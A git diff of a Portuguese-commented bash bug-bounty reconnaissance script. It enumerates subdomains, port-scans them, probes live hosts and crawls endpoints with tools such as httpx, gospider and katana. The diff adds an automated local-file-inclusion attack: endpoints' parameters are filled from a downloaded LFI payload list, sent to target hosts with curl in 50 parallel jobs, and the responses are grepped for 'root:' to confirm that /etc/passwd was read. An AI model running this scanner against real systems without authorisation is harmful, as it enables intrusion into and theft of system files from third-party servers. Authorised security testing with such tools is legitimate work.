@@ -107,17 +107,17 @@ curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep -v "RapidDN
 # Executando Naabu
 echo "Running naabu..."
 naabu -c 250 -l "$folder/subdomains_tmp.txt" -port "80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,3000,5000,8080,8000,8081,8888,8069,8009,8001,8070,8088,8002,8060,8091,8086,8010,8050,8085,8089,8040,8020,8051,8087,8071,8011,8030,8061,8072,8100,8083,8073,8099,8092,8074,8043,8035,8055,8021,8093,8022,8075,8044,8062,8023,8094,8012,8033,8063,8045,7000,9000,7070,9001,7001,10000,9002,7002,9003,7003,10001,80,443,4443" | anew "$folder/portscan.txt"
-echo "Running httprobe Live ports"
-cat "$folder/portscan.txt" | httprobe -c 25 >> "$folder/liveports.txt"
+echo "Running httpx Live ports"
+httpx -l "$folder/portscan.txt" -o "$folder/liveports.txt"
 
 # Limpando e ordenando subdomínios
 echo "Cleaning and sorting subdomains..."
 sort -u "$folder/subdomains_tmp.txt" >> "$folder/subdomains.txt"
 rm "$folder/subdomains_tmp.txt"
 
-# Executando httprobe para encontrar subdomínios ativos
+# Executando httpx para encontrar subdomínios ativos
 echo "Finding live subdomains..."
-cat "$folder/subdomains.txt" | httprobe -c 25 >> "$folder/live_subdomains.txt"
+httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"
 
 # filter subdomains by keywords
 echo "filter subdomains by keywords..."
@@ -131,6 +131,10 @@ cat "$folder/live_subdomains.txt" | gau --threads 5 >> "$folder/Endpoints.txt"
 echo "Executando waybackurls..."
 cat "$folder/live_subdomains.txt" | waybackurls >> "$folder/Endpoints.txt"
 
+# Executando gospider
+echo "Executando gospider..."
+gospider -S "$folder/live_subdomains.txt" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source | grep "code-200" | awk '{print $5}' >> "$folder/Endpoints.txt"
+
 # Executando katana com a flag -jc para encontrar mais endpoints
 echo "Finding endpoints with katana..."
 cat "$folder/live_subdomains.txt" | katana -d 10 -jc >> "$folder/Endpoints.txt"
@@ -139,7 +143,17 @@ cat "$folder/live_subdomains.txt" | katana -d 10 -jc >> "$folder/Endpoints.txt"
 echo "Removing duplicates from Endpoints.txt..."
 uro -i "$folder/Endpoints.txt" -o "$folder/Endpoints.txt"
 
-# Usando gf xss matcher para encontrar vulnerabilidades XSS
+# Usando gf patterns
+echo "Finding gf lfi vulnerabilities with gf..."
+# Passar caminho da Wordlist de paylouds!!!
+# https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt 
+cat "$folder/Endpoints.txt" | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
+cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
+xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
+mv Lfi.txt "$folder/lfi.txt"
+rm templfi.txt
+
+# Usando Finding XSS vulnerabilities
 echo "Finding XSS vulnerabilities with gf..."
 cat "$folder/Endpoints.txt" | gf xss >> "$folder/xss.txt"
 
